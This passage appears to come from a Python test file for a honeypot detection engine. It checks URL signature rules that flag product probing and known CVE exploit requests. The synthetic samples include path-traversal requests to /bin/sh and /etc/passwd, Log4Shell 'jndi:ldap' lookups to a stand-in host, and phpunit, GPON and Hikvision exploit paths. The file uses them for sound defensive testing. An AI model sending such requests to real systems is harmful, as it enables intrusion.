                             "AND rule_id IN ('R003', 'R006') AND first_ts <= %s::timestamptz - interval '1 hour' "
                             "AND NOT EXISTS (SELECT 1 FROM verdicts v WHERE v.incident_key = i.incident_key)", (t,))
            judged += self.cur.rowcount
            t += timedelta(hours=6)
        self.run_doc("rules_v3.json")
        self.assertGreater(judged, 0)
        self.assertEqual({r[0] for r in self.rows("v3")}, replay)
        self.cur.execute("SELECT first_key, member_key, kind FROM incident_absorbed WHERE rule_version = 'v3'")
        self.assertEqual(set(self.cur.fetchall()), records)
        # 판정으로 굳은 첫 사건 근거에는 판정 뒤의 흡수가 없다. 전부는 기록 표에 있다
        self.cur.execute("SELECT coalesce(sum((evidence #>> '{absorbed,incidents}')::int), 0) FROM incidents "
                         "WHERE rule_version = 'v3' AND rule_id IN ('R003', 'R006')")
        self.assertLess(self.cur.fetchone()[0], sum(1 for r in records if r[2] == "absorbed"))


# ----------------------------------------------------------------------
#  요청 경로 서명 (이슈 #39): c1 R105 · R106
# ----------------------------------------------------------------------

# url_signature 신호 질의 (범위 조각 {w} 자리). 엔진 상수를 쓰지 않고 글자 그대로 적어 문장이 바뀌면 드러나게 한다
URL_SIGNATURE_SQL = (
    "SELECT e.ts, e.src_ip, e.session, e.eventid, e.sensor, e.http_method, e.url, e.http_status, "
    "array_agg(s.sig_id ORDER BY s.sig_id COLLATE \"C\") "
    "FROM events e JOIN unnest(%s::text[], %s::text[], %s::text[]) AS s(sig_id, sig_pattern, sig_method) "
    "ON e.url ~* s.sig_pattern AND coalesce(e.http_method, '') ~* s.sig_method "
    "WHERE {w} AND eventid = ANY(%s) GROUP BY e.line_hash")
WEB_EVENTIDS = ["nginx.request", "decoy.request"]
DETAIL_KEYS = ["eventid", "sensor", "http_method", "url", "http_status", "signatures"]

# 합성 URL 표본 (메서드, url, {규칙: 맞아야 하는 서명 id}). 운영 DB(9/18 ~ 9/24)에 R106 매치가 0건이라 합성으로 본다.
# web-01(nginx)의 url 은 원시 요청 대상(%2e · 질의 그대로), 디코이는 1회 디코딩된 경로라 두 모양을 함께 둔다
URL_SAMPLES = [
    ("GET", "/cgi-bin/../../../../bin/sh", {"R106": ["apache-path-traversal"]}),          # 디코이 (디코딩됨)
    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/bin/sh", {"R106": ["apache-path-traversal"]}),        # 원시
    ("GET", "/icons/.%2e/%2e%2e/%2e%2e/etc/passwd", {"R106": ["apache-path-traversal"]}),
    ("POST", "/cgi-bin/.%%32%65/.%%32%65/bin/sh", {"R106": ["apache-path-traversal"]}),   # CVE-2021-42013 이중 인코딩
    ("GET", "/CGI-BIN/%2E%2E/x", {"R106": ["apache-path-traversal"]}),                     # 대소문자
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {"R106": ["phpunit-eval-stdin"]}),
    ("POST", "/GponForm/diag_Form", {"R106": ["gpon-diag-form"]}),
    ("PUT", "/SDK/webLanguage", {"R106": ["hikvision-weblanguage"]}),
    ("put", "/sdk/weblanguage", {"R106": ["hikvision-weblanguage"]}),                      # 메서드도 대소문자 무시
    ("GET", "/SDK/webLanguage", {}),                                                       # GET 은 제품 확인이라 세지 않는다
    (None, "/SDK/webLanguage", {}),                                                        # 메서드가 없는 행
    ("GET", "/${jndi:ldap://x/a}", {"R106": ["log4shell-in-path"]}),
    ("GET", "/%24%7Bjndi%3Aldap://x}", {"R106": ["log4shell-in-path"]}),
    ("GET", "/cgi-bin/../${jndi:ldap://x/a}", {"R106": ["apache-path-traversal", "log4shell-in-path"]}),  # 서명 둘
    ("GET", "/geoserver", {"R105": ["geoserver"]}),
    ("GET", "/geoserver/web/", {"R105": ["geoserver"]}),
    ("GET", "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage", {"R105": ["geoserver"]}),
    ("GET", "/geoserverx", {}),
    ("GET", "/geoserver/${jndi:ldap://x}", {"R105": ["geoserver"], "R106": ["log4shell-in-path"]}),  # 규칙 둘
    ("GET", "/owa", {"R105": ["exchange-owa"]}),
    ("GET", "/owa/", {"R105": ["exchange-owa"]}),
    ("GET", "/owa/auth/logon.aspx?url=x", {"R105": ["exchange-owa"]}),                    # nginx 는 질의까지 남긴다
    # web-01(nginx)의 url 은 질의 문자열까지 남는다. 서명 끝의 (\?.*)? 가 없으면 아래가 모두 빠진다
    ("GET", "/GponForm/diag_Form?images/", {"R106": ["gpon-diag-form"]}),                 # CVE-2018-10561 의 대표 형태
    ("GET", "/cgi-bin/authLogin.cgi?app=x", {"R105": ["qnap-qts"]}),
    ("GET", "/HNAP1/?x", {"R105": ["dlink-hnap"]}),
    ("GET", "/geoserver?x=1", {"R105": ["geoserver"]}),
    ("GET", "/owa?x=1", {"R105": ["exchange-owa"]}),
    ("PUT", "/SDK/webLanguage?x", {"R106": ["hikvision-weblanguage"]}),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?x", {"R106": ["phpunit-eval-stdin"]}),
    ("GET", "/owax?y", {}),
    (None, "/owa", {"R105": ["exchange-owa"]}),                                            # methods 가 없으면 메서드를 보지 않는다
    ("GET", "/owax", {}),
    # 디코이는 %0A 를 줄바꿈으로 풀어 남긴다. PostgreSQL 정규식의 . 은 줄바꿈에도 맞고 $ 는 문자열 끝에만 맞는다
    ("GET", "/owa/\n", {"R105": ["exchange-owa"]}),
    ("GET", "/owa\n", {}),
    ("POST", "/HNAP1", {"R105": ["dlink-hnap"]}),
    ("GET", "/HNAP1/", {"R105": ["dlink-hnap"]}),
    ("GET", "/confluence/rest/applinks/1.0/manifest", {"R105": ["confluence"]}),
    ("GET", "/dana-na/nc/nc_gina_ver.txt", {"R105": ["ivanti-connect-secure"]}),
    ("GET", "/apps/zxtm/login.cgi", {"R105": ["ivanti-vtm"]}),
    ("GET", "/cgi-bin/authLogin.cgi", {"R105": ["qnap-qts"]}),
    ("GET", "/MagicInfo/config.js", {"R105": ["samsung-magicinfo"]}),
    ("GET", "/cgi-bin/test.cgi", {}),
    ("GET", "/icons/x.png", {}),
    ("GET", "", {}),                                   # web-01 이 루트 위로 가는 경로를 400 으로 거절하며 url 을 비운 행
]


# 두 엔진(PostgreSQL ~* · 파이썬 re)이 다르게 읽거나 한쪽만 받는 정규식. 서명의 pattern · kev_match · images 에 두면
# 규칙 오류다. 맨 앞 (?i) 도 받지 않는다(대소문자는 이미 가리지 않고, 플래그 글자의 뜻이 두 엔진에서 다르다)
REGEX_GAPS = [
    r"\bgeo", r"geo\B", r"(?P<n>geo)", r"(?P<n>g)(?P=n)", r"(?<n>geo)", r"(?<=x)geo", r"(?<!x)geo", r"geo(?=x)",
    r"geo(?!x)", r"geo(?i)x", r"(?i)geo", r"(?i:geo)", r"(?m)^geo", r"(?>geo)", r"(?#c)geo", r"(g)\1", r"(g)(e)\2",
    r"[\1]geo", r"[[:alpha:]]+", r"[[=e=]]", r"[[.a.]]", r"x[a[:digit:]]", r"[[a]geo", r"[a-z&&[^e]]", r"[a[]geo",
    r"[a&&b]", r"[a||b]", r"[a~~b]", r"[a--b]",
    r"geo{,2}", r"geo*+", r"geo++", r"geo?+", r"ge{2}+o", r"(geo)++", r"geo\z",
    r"(geo", r"geo)", r"geo\y", r"\mgeo", r"*geo", r"***=geo", r"[geo",
]
# 두 엔진이 같게 읽는 것. 위와 비슷해 보여도 받는다
REGEX_SAME = [
    r"^(QTS|.*Network.Attached Storage.*)$", r"(^|/)confluence(:|@|$)", r"^(Ivanti|Pulse Secure)$",
    r"geo\\b", r"geo\(?x", r"[(?]geo", r"[?(]geo", r"(?:geo)+?", r"(?:g|e)*o", r"geo{2}", r"geo{2,}", r"ge{1,3}o",
    r"ge{1,3}?o", r"\{geo\}", r"(\$|%24)(\{|%7b)jndi(:|%3a)", r"[]a]geo", r"[^]a]geo", r"[a-z]+?", r"geo+?",
    r"\Ageo\Z", r"%2e", r"[\]]geo", r"geo\+", r"geo\++", r"geo\?+", r"a[+?*]+", r"\(\?geo",
    r"\d+\.\d+", r"[0-9]{4}", r"\.%2e", r"(\.|%2e|%%32%65){2}/", r"[\[a]geo", r"[a&b|c~d-]", r"[-a]", r"&&geo",
]


def sig_match(rule, method, url):
    """서명의 파이썬 동치. 맞는 서명 id 를 정렬해 돌려준다.

    re.fullmatch(pattern, url, re.I) 에 re.S 를 더한다. PostgreSQL 정규식(ARE)은 기본으로 . 이 줄바꿈에도 맞고, 파이썬
    fullmatch 는 줄바꿈 앞의 $ 로는 끝을 맞추지 못하므로, 둘을 함께 주면 줄바꿈이 든 url 에서도 같은 답이 된다.
    """
    return sorted(s["id"] for s in rule["params"]["signatures"]
                  if re.fullmatch(s["pattern"], url, re.I | re.S)
                  and ("methods" not in s or (method or "").upper() in s["methods"]))


def sig_rule(**sig):
    """서명 하나짜리 시험 규칙. 키를 None 으로 주면 그 키를 뺀다."""
    base = {"id": "a", "pattern": "^/a$", "cves": [], "mapping": "analyst"}
    base.update(sig)
    return {"id": "U1", "type": "url_signature",
            "params": {"eventids": ["nginx.request"], "signatures": [{k: v for k, v in base.items() if v is not None}]}}


def cve_doc(*rids):
    """rules_cve.json 에서 주어진 규칙만 남긴 정의."""
    doc = copy.deepcopy(load("rules_cve.json"))
    doc["rules"] = [r for r in doc["rules"] if r["id"] in rids]
    return doc


class UrlSignatureTest(unittest.TestCase):
    """url_signature 의 문장 · 인자 순서 · 형식 오류 · 신호 모양."""

    def test_문장과_인자(self):
        doc, rule = rule_of("rules_cve.json", "R106")
        sigs = rule["params"]["signatures"]
        ids = [s["id"] for s in sigs]
        pats = [f"^(?:{s['pattern']})$" for s in sigs]
        methods = ["^(PUT)$" if s["id"] == "hikvision-weblanguage" else "^.*$" for s in sigs]
        for rng, where in (((None, None), "provenance = 'real'"),
                           ((SINCE, UNTIL), "provenance = 'real' AND ts >= %s AND ts < %s"),
                           ((SINCE, None), "provenance = 'real' AND ts >= %s")):
            with self.subTest(rng=rng):
                [(sql, prm)] = collect(doc, rule, *rng)
                self.assertEqual(sql, URL_SIGNATURE_SQL.replace("{w}", where))
                self.assertEqual(prm, [ids, pats, methods] + [x for x in rng if x] + [WEB_EVENTIDS])
                self.assertEqual(sql.count("%s"), len(prm))
        self.assertEqual(detect.URL_SIGNATURE_SQL.format(w="x"), URL_SIGNATURE_SQL.replace("{w}", "x"))

    def test_메서드는_대문자_선택지_하나로(self):
        for methods, want in ((["PUT"], "^(PUT)$"), (["PUT", "POST"], "^(PUT|POST)$"), (None, "^.*$")):
            with self.subTest(methods=methods):
                [(_, prm)] = collect({"rule_version": "t1"}, sig_rule(methods=methods))
                self.assertEqual(prm[2], [want])

    def test_옳은_형식은_받는다(self):
        # 탐지가 쓰지 않는 키(product · vendor · source)는 보지 않는다. 빈 cves 는 R105 의 꼴이다.
        # kev_match · asset_match 는 없어도 되고, 있으면 형식을 본다. platforms · packages · images 는 빈 목록도 된다
        for sig in ({}, {"methods": ["GET", "HEAD"]}, {"cves": ["CVE-2021-41773", "CVE-2024-123456"]},
                    {"mapping": "explicit", "product": "시험", "kev_match": {"vendor": "^x$"},
                     "asset_match": {"platforms": [], "packages": [], "images": []}},
                    {"kev_match": {"vendor": "^(Ivanti|Pulse Secure)$", "product": "Connect Secure", "text": "HNAP"}},
                    {"asset_match": {"platforms": ["linux", "windows", "appliance"],
                                     "packages": ["apache2", "liblog4j2-java", "libstdc++6", "g++-13", "python3.12"],
                                     "images": ["(^|/)httpd(:|@|$)"], "note": "시험"}},
                    {"id": "a0-b", "pattern": "^.*$"}):
            with self.subTest(sig=sig):
                self.assertEqual(len(collect({"rule_version": "t1"}, sig_rule(**sig))), 1)

    def test_KEV_자산_조건_형식이_틀리면_규칙_오류(self):
        # 콘솔(app/cti.py) · CTI 수집기가 rule_versions 에서 읽는 조건이다. 틀린 정의가 한 번 들어가면 같은 버전으로는
        # 고칠 수 없으므로(ON CONFLICT DO NOTHING) 탐지가 먼저 거절한다. 모르는 키도 오타로 보고 거절한다
        full = {"platforms": ["linux"], "packages": [], "images": []}
        bad = [{"kev_match": v} for v in (
            None, "^x$", [], {}, {"product": "^x$"}, {"vendor": ""}, {"vendor": 1}, {"vendor": None},
            {"vendor": "^x$", "product": None}, {"vendor": "^x$", "product": ""}, {"vendor": "^x$", "text": 1},
            {"vendor": "^x$", "text": ["x"]}, {"vendor": "^x$", "vendors": "^y$"})]
        bad += [{"asset_match": v} for v in (
            None, [], "linux", {}, {"platforms": ["linux"], "packages": []},
            {"platforms": ["linux"], "images": []}, {"packages": [], "images": []},
            dict(full, platforms="linux"), dict(full, platforms=["mac"]), dict(full, platforms=["Linux"]),
            dict(full, platforms=["linux", "linux"]), dict(full, platforms=[None]),
            dict(full, packages="apache2"), dict(full, packages=[1]), dict(full, packages=[""]),
            dict(full, packages=["Apache2"]), dict(full, packages=["apache 2"]), dict(full, packages=["a"]),
            dict(full, packages=["-a"]), dict(full, images="(^|/)httpd"), dict(full, images=[1]),
            dict(full, images=[""]), dict(full, images=None), dict(full, note=1), dict(full, note=""),
            dict(full, note=None), dict(full, image=[]))]
        for sig in bad:
            with self.subTest(sig=sig):
                r = sig_rule()
                r["params"]["signatures"][0].update(sig)                  # None 도 값으로 넣는다(sig_rule 은 키를 뺀다)
                with self.assertRaisesRegex(ValueError, "^U1: 서명 a 의 (kev_match|asset_match)"):
                    collect({"rule_version": "t1"}, r)

    def test_두_엔진이_다르게_읽는_정규식은_규칙_오류(self):
        # pattern · kev_match 는 PostgreSQL(~*)이, kev_match · images 는 파이썬(re.search)이 읽는다. 어느 자리에 있어도 거절한다
        for text in REGEX_GAPS:
            for where, sig in (("pattern", {"pattern": f"^{text}$"}),
                               ("kev_match.vendor", {"kev_match": {"vendor": text}}),
                               ("kev_match.product", {"kev_match": {"vendor": "^x$", "product": text}}),
                               ("kev_match.text", {"kev_match": {"vendor": "^x$", "text": text}}),
                               ("asset_match.images", {"asset_match": {"platforms": [], "packages": [],
                                                                       "images": ["^ok$", text]}})):
                with self.subTest(where=where, text=text):
                    with self.assertRaisesRegex(ValueError, f"^U1: 서명 a 의 {re.escape(where)} "):
                        collect({"rule_version": "t1"}, sig_rule(**sig))
                    self.assertIsNotNone(detect.regex_gap(text))

    def test_두_엔진이_같게_읽는_정규식은_받는다(self):
        for text in REGEX_SAME:
            with self.subTest(text=text):
                self.assertIsNone(detect.regex_gap(text))
                sig = {"pattern": f"^{text}$", "kev_match": {"vendor": text, "product": text, "text": text},
                       "asset_match": {"platforms": [], "packages": [], "images": [text]}}
                self.assertEqual(len(collect({"rule_version": "t1"}, sig_rule(**sig))), 1)

    def test_형식이_틀리면_규칙_오류(self):
        bad_sigs = [
            {"id": ""}, {"id": "A"}, {"id": "-a"}, {"id": "a_b"}, {"id": "a b"}, {"id": 1}, {"id": "a\n"},
            {"pattern": ""}, {"pattern": "^$"}, {"pattern": "/a"}, {"pattern": "^/a"}, {"pattern": "/a$"},
            {"pattern": 1},
            {"methods": []}, {"methods": "PUT"}, {"methods": ["put"]}, {"methods": ["P-UT"]}, {"methods": [""]},
            {"methods": ["PUT\n"]}, {"methods": [1]},
            {"cves": "CVE-2021-41773"}, {"cves": ["CVE-21-41773"]}, {"cves": ["cve-2021-41773"]},
            {"cves": ["CVE-2021-123"]}, {"cves": ["CVE-2021-41773\n"]}, {"cves": [None]},
            {"mapping": "exact"}, {"mapping": ["explicit"]},
        ]
        rules = [sig_rule(**s) for s in bad_sigs]
        for key in ("id", "pattern", "cves", "mapping"):                   # 빠져도 오류
            r = sig_rule()
            del r["params"]["signatures"][0][key]
            rules.append(r)
        r = sig_rule()
        r["params"]["signatures"][0]["methods"] = None                     # 키가 있으면 목록이어야 한다
        rules.append(r)
        r = sig_rule()
        r["params"]["signatures"].append(dict(r["params"]["signatures"][0], pattern="^/b$"))   # id 겹침
        rules.append(r)
        for params in ({"eventids": []}, {"eventids": "nginx.request"}, {"eventids": [""]}, {"eventids": [1]},
                       {"eventids": None}, {"signatures": []}, {"signatures": {}}, {"signatures": None},
                       {"signatures": ["a"]}, {"signatures": [None]}, {"sensors": []}):
            r = sig_rule()
            r["params"].update(params)
            rules.append({**r, "params": {k: v for k, v in r["params"].items() if v is not None}})
        for r in rules:
            with self.subTest(params=r["params"]):
                with self.assertRaisesRegex(ValueError, "^U1: "):
                    collect({"rule_version": "t1"}, r)

    def test_신호_모양(self):
        doc, rule = rule_of("rules_cve.json", "R106")
        rows = [(at(0), "192.0.2.7", None, "nginx.request", "web-01", "GET", "/%24%7Bjndi%3Aldap://x}", 404,
                 ["log4shell-in-path"]),
                (at(1), "192.0.2.7", "d1a2b3c4", "decoy.request", "decoy", "GET", "/cgi-bin/../${jndi:ldap://x/a}",
                 404, ["apache-path-traversal", "log4shell-in-path"])]
        sig = signals_of(doc, rule, lambda sql: rows)
        self.assertEqual(sig, [
            (at(0), "192.0.2.7", None, {"eventid": "nginx.request", "sensor": "web-01", "http_method": "GET",
                                        "url": "/%24%7Bjndi%3Aldap://x}", "http_status": 404,
                                        "signatures": ["log4shell-in-path"]}),
            (at(1), "192.0.2.7", "d1a2b3c4", {"eventid": "decoy.request", "sensor": "decoy", "http_method": "GET",
                                              "url": "/cgi-bin/../${jndi:ldap://x/a}", "http_status": 404,
                                              "signatures": ["apache-path-traversal", "log4shell-in-path"]})])
        for _, _, _, d in sig:
            self.assertEqual(list(d), DETAIL_KEYS)
            # run() 이 임계치로 읽는 키 · 제어 필드를 쓰지 않는다
            self.assertFalse(set(d) & {"count", "sigma", "mean", "z", *detect.CONTROL_FIELDS})

    def test_요청_하나는_신호_하나(self):
        # 서명마다 한 행씩 이은 뒤 요청(line_hash)으로 다시 묶는다. 서명 여럿에 맞은 요청은 id 를 모두 가진 한 행이다
        doc, rule = rule_of("rules_cve.json", "R106")
        [(sql, _)] = collect(doc, rule)
        self.assertTrue(sql.endswith(" GROUP BY e.line_hash"))
        self.assertIn("array_agg(s.sig_id ORDER BY s.sig_id COLLATE \"C\")", sql)
        self.assertEqual(sig_match(rule, "GET", "/cgi-bin/../${jndi:ldap://x/a}"),
                         ["apache-path-traversal", "log4shell-in-path"])


class UrlSignatureRunTest(unittest.TestCase):
    """run() 이 근거에 신호 전체의 서명 id · 발생원 합집합을 붙인다. 서명 키가 없는 규칙은 근거가 그대로다."""

    @staticmethod
    def request(m, ip, sensor, url, ids, session=None, method="GET", status=404):
        eventid = "decoy.request" if sensor == "decoy" else "nginx.request"
        return (at(m), ip, session, eventid, sensor, method, url, status, ids)

    def test_근거에_서명_발생원_합집합(self):
        ip = "203.0.113.9"
        r106 = [self.request(0, ip, "decoy", "/cgi-bin/../../bin/sh", ["apache-path-traversal"], "d1"),
                self.request(1, ip, "decoy", "/cgi-bin/../../../bin/sh", ["apache-path-traversal"], "d1"),
                self.request(2, ip, "web-01", "/GponForm/diag_Form", ["gpon-diag-form"], method="POST"),
                self.request(3, ip, "decoy", "/icons/../../etc/passwd", ["apache-path-traversal"], "d2"),
                self.request(4, ip, "decoy", "/cgi-bin/../../bin/bash", ["apache-path-traversal"], "d2"),
                # 표본(앞 5개) 밖에만 있는 서명 · 발생원도 근거에 남는다. 발생원이 없는 신호는 세지 않는다
                self.request(5, ip, "web-02", "/SDK/webLanguage", ["hikvision-weblanguage"], method="PUT"),
                self.request(6, ip, None, "/${jndi:ldap://x}", ["log4shell-in-path"]),
                # 통합 창(15분) 밖은 다른 사건이다
                self.request(60, ip, "decoy", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                             ["phpunit-eval-stdin"], "d3", method="POST")]
        r105 = [self.request(0, "198.51.100.5", "decoy", "/geoserver/web/", ["geoserver"], "d9"),
                self.request(1, "198.51.100.5", "web-01", "/owa/", ["exchange-owa"])]
        answers = iter([r105, r106])

        def answer(sql):
            if sql.startswith("SELECT e.ts, e.src_ip"):
                return next(answers)
            return db_answer()(sql)

        doc = load("rules_cve.json")
        cur, conn, _ = run_quiet(doc, answer)
        [(sql5, rows5), (sql6, rows6)] = cur.batches
        self.assertEqual((sql5, sql6), (detect.INSERT_BASE, detect.INSERT_BASE))
        self.assertEqual(conn.commits, 1)

        [g] = rows5
        self.assertEqual(g[:10], (f"R105|c1|198.51.100.5|{at(0).isoformat()}", "R105", "c1", "제품 식별 탐색", "low",
                                  "198.51.100.5", at(0), at(1), 2, 1))
        ev = json.loads(g[10])
        self.assertEqual((ev["signatures"], ev["sensors"]), (["exchange-owa", "geoserver"], ["decoy", "web-01"]))

        big, late = rows6
        self.assertEqual(big[:10], (f"R106|c1|{ip}|{at(0).isoformat()}", "R106", "c1", "알려진 취약점 공격 시도",
                                    "medium", ip, at(0), at(6), 7, 2))
        ev = json.loads(big[10])
        self.assertEqual(list(ev), ["sample", "sessions", "signatures", "sensors"])
        self.assertEqual(len(ev["sample"]), 5)
        self.assertEqual(ev["sample"][2], {"eventid": "nginx.request", "sensor": "web-01", "http_method": "POST",
                                           "url": "/GponForm/diag_Form", "http_status": 404,
                                           "signatures": ["gpon-diag-form"]})
        self.assertEqual(ev["sessions"], ["d1", "d2"])
        self.assertEqual(ev["signatures"], ["apache-path-traversal", "gpon-diag-form", "hikvision-weblanguage",
                                            "log4shell-in-path"])
        self.assertEqual(ev["sensors"], ["decoy", "web-01", "web-02"])
        ev = json.loads(late[10])
        self.assertEqual((late[6], ev["signatures"], ev["sensors"]), (at(60), ["phpunit-eval-stdin"], ["decoy"]))

    def test_서명_키가_없으면_근거가_그대로(self):
        # 발생원 키만 있고 서명 키가 없는 신호(다른 유형)는 합집합을 붙이지 않는다
        doc = {"rule_version": "x1", "aggregation": {"window_gap_seconds": 900},
               "rules": [{"id": "X3", "name": "시험", "severity": "low", "type": "x_plain", "params": {}}]}
        sig = [(at(0), "6.6.6.6", "s1", {"eventid": "e", "sensor": "web-01"}),
               (at(1), "6.6.6.6", None, {"eventid": "e", "sensor": "decoy", "count": 3})]
        with mock.patch.dict(detect.COLLECTORS, {"x_plain": lambda *a: sig}):
            cur, _, _ = run_quiet(doc)
        [(_, [row])] = cur.batches
        self.assertEqual(row[10], json.dumps({"sample": [d for *_, d in sig], "sessions": ["s1"],
                                              "observed_count_max": 3}, ensure_ascii=False))

    def test_옛_규칙_파일의_근거에는_합집합이_없다(self):
        for name in ("rules.json", "rules_v2.json", "rules_node.json", "rules_self.json", "rules_w1.json"):
            with self.subTest(rules=name):
                cur, _, _ = run_quiet(load(name), signal_answer)
                rows = [r for _, rs in cur.batches for r in rs]
                self.assertTrue(rows)
                for r in rows:
                    self.assertFalse({"signatures", "sensors"} & set(json.loads(r[10])))


class CveRuleFileTest(unittest.TestCase):
    """rules_cve.json(c1). 저장소의 진짜 파일을 읽어 본다."""

    def test_규칙과_서명_목록(self):
        doc = load("rules_cve.json")
        self.assertEqual(doc["rule_version"], "c1")
        self.assertEqual([(r["id"], r["name"], r["severity"], r["type"]) for r in doc["rules"]], [
            ("R105", "제품 식별 탐색", "low", "url_signature"),
            ("R106", "알려진 취약점 공격 시도", "medium", "url_signature")])
        # 억제 · 흡수를 쓰지 않는다. R105 · R106 · w2 R102 는 서로 지우지 않는다
        self.assertNotIn("suppression", doc)
        r105, r106 = doc["rules"]
        for rule in doc["rules"]:
            with self.subTest(rule=rule["id"]):
                self.assertEqual(set(rule["params"]), {"eventids", "signatures"})
                self.assertEqual(rule["params"]["eventids"], WEB_EVENTIDS)
                self.assertIsNone(detect.absorb_conf(rule))
                for s in rule["params"]["signatures"]:
                    self.assertIn(s["mapping"], detect.SIG_MAPPINGS)
                    self.assertTrue(s["product"] and s["vendor"] and s["source"])
                    self.assertLessEqual(set(s["asset_match"]["platforms"]), {"linux", "windows", "appliance"})
                    self.assertTrue(s["asset_match"]["platforms"])
        self.assertEqual([s["id"] for s in r105["params"]["signatures"]], [
            "confluence", "dlink-hnap", "exchange-owa", "geoserver", "ivanti-connect-secure", "ivanti-vtm",
            "qnap-qts", "samsung-magicinfo"])
        self.assertEqual([s["id"] for s in r106["params"]["signatures"]], [
            "apache-path-traversal", "gpon-diag-form", "hikvision-weblanguage", "log4shell-in-path",
            "phpunit-eval-stdin"])
        # R105 는 CVE 를 적지 않고 KEV 에서 제품으로 찾는다. R106 은 서명마다 CVE 를 적는다
        for s in r105["params"]["signatures"]:
            self.assertEqual(s["cves"], [])
            self.assertTrue(s["kev_match"]["vendor"])
        for s in r106["params"]["signatures"]:
            self.assertTrue(s["cves"])
            self.assertNotIn("kev_match", s)
        self.assertEqual({s["id"]: s["methods"] for s in r106["params"]["signatures"] if "methods" in s},
                         {"hikvision-weblanguage": ["PUT"]})
        self.assertFalse(any("methods" in s for s in r105["params"]["signatures"]))

    def test_탐지기가_받는_형식(self):
        doc = load("rules_cve.json")
        for rule in doc["rules"]:
            with self.subTest(rule=rule["id"]):
                [(_, prm)] = collect(doc, rule)
                self.assertEqual(prm[0], [s["id"] for s in rule["params"]["signatures"]])

    def test_합성_URL_표본(self):
        doc = load("rules_cve.json")
        for method, url, want in URL_SAMPLES:
            for rule in doc["rules"]:
                with self.subTest(url=url, method=method, rule=rule["id"]):
                    self.assertEqual(sig_match(rule, method, url), want.get(rule["id"], []))

    def test_표본이_서명_전부를_덮는다(self):
        doc = load("rules_cve.json")
        hit = {i for _, _, want in URL_SAMPLES for ids in want.values() for i in ids}
        self.assertEqual(hit, {s["id"] for r in doc["rules"] for s in r["params"]["signatures"]})


# url_signature DB 시험의 연결 전용 임시 표(search_path=pg_temp). 운영 표와 같은 열만 둔다
URL_SIGNATURE_TEMP_TABLES = """
    CREATE TEMP TABLE events (line_hash text PRIMARY KEY, ts timestamptz NOT NULL, eventid text NOT NULL,
        session text, src_ip inet, url text, provenance text NOT NULL DEFAULT 'real', http_method text,
        http_status integer, sensor text NOT NULL DEFAULT 'cowrie');
    CREATE TEMP TABLE incidents (incident_key text PRIMARY KEY, rule_id text NOT NULL,
        rule_version text NOT NULL, rule_name text, severity text NOT NULL, actor_ip inet,
        first_ts timestamptz NOT NULL, last_ts timestamptz NOT NULL, signal_count integer NOT NULL,
        session_count integer, evidence jsonb, status text NOT NULL DEFAULT 'open',
        created_at timestamptz NOT NULL DEFAULT now(), target text);
    CREATE TEMP TABLE verdicts (id bigserial PRIMARY KEY, incident_key text NOT NULL
        REFERENCES incidents (incident_key) ON DELETE CASCADE, verdict text NOT NULL);
    CREATE TEMP TABLE rule_versions (rule_version text PRIMARY KEY, definition jsonb NOT NULL, reason text);
"""


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class UrlSignatureDatabaseTest(unittest.TestCase):
    """url_signature 문장을 연결 전용 임시 테이블(search_path=pg_temp)에 실제로 돌린다. 운영 테이블은 건드리지 않는다.

    합성 URL 표본을 web-01(nginx.request)과 디코이(decoy.request) 요청으로 한 번씩 넣고, PostgreSQL 의 답이 파이썬
    re 와 같은지 본다. 같은 url 의 디코이 세션 연결 행 · 자체 시험(fixture) 행 · url 없는 행은 신호가 아니다.
    """

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute(URL_SIGNATURE_TEMP_TABLES)
        self.rows = []
        for i, (method, url, _) in enumerate(URL_SAMPLES):
            self.rows += [(f"n{i}", at(i), "nginx.request", None, "192.0.2.10", url, "real", method, 404, "web-01"),
                          (f"d{i}", at(i) + timedelta(seconds=30), "decoy.request", f"s{i}", "192.0.2.20", url,
                           "real", method, 404, "decoy")]
        noise = [("x1", at(0), "decoy.session.connect", "s0", "192.0.2.20", "/owa", "real", "GET", None, "decoy"),
                 ("x2", at(0), "decoy.login.failed", "s0", "192.0.2.20", "/owa", "real", "POST", 200, "decoy"),
                 ("x3", at(0), "nginx.request", None, "127.0.0.1", "/owa", "fixture", "GET", 404, "web-01"),
                 ("x4", at(0), "nginx.request", None, "192.0.2.10", None, "real", "GET", 400, "web-01")]
        self.cur.executemany("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)", self.rows + noise)

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def signals(self, rid, since=None, until=None, sensors=None):
        doc, rule = rule_of("rules_cve.json", rid)
        rule = detect.prepare_rule(doc, copy.deepcopy(rule))
        if sensors:
            rule["params"]["sensors"] = sensors
        return detect.signals_url_signature(self.cur, rule, since, until)

    def want(self, rid, keep=lambda row: True):
        _, rule = rule_of("rules_cve.json", rid)
        out = []
        for _, ts, eventid, session, ip, url, _, method, status, sensor in self.rows:
            ids = sig_match(rule, method, url)
            if ids and keep((ts, sensor)):
                out.append((ts, ip, session, {"eventid": eventid, "sensor": sensor, "http_method": method,
                                              "url": url, "http_status": status, "signatures": ids}))
        return sorted(out, key=lambda s: s[0])

    def test_파이썬과_같은_답(self):
        for rid in ("R105", "R106"):
            with self.subTest(rule=rid):
                got = sorted(self.signals(rid), key=lambda s: s[0])
                self.assertEqual(got, self.want(rid))
                self.assertTrue(got)
        # 서명 둘에 맞은 요청은 발생원마다 신호 하나다
        two = [d for _, _, _, d in self.signals("R106") if len(d["signatures"]) > 1]
        both = ["apache-path-traversal", "log4shell-in-path"]
        self.assertEqual(sorted((d["sensor"], d["url"], d["signatures"]) for d in two),
                         [("decoy", "/cgi-bin/../${jndi:ldap://x/a}", both),
                          ("web-01", "/cgi-bin/../${jndi:ldap://x/a}", both)])

    def test_기간과_발생원(self):
        since, until = at(5), at(20)
        got = sorted(self.signals("R105", since.isoformat(), until.isoformat(), ["decoy"]), key=lambda s: s[0])
        self.assertEqual(got, self.want("R105", lambda k: since <= k[0] < until and k[1] == "decoy"))
        self.assertTrue(got)

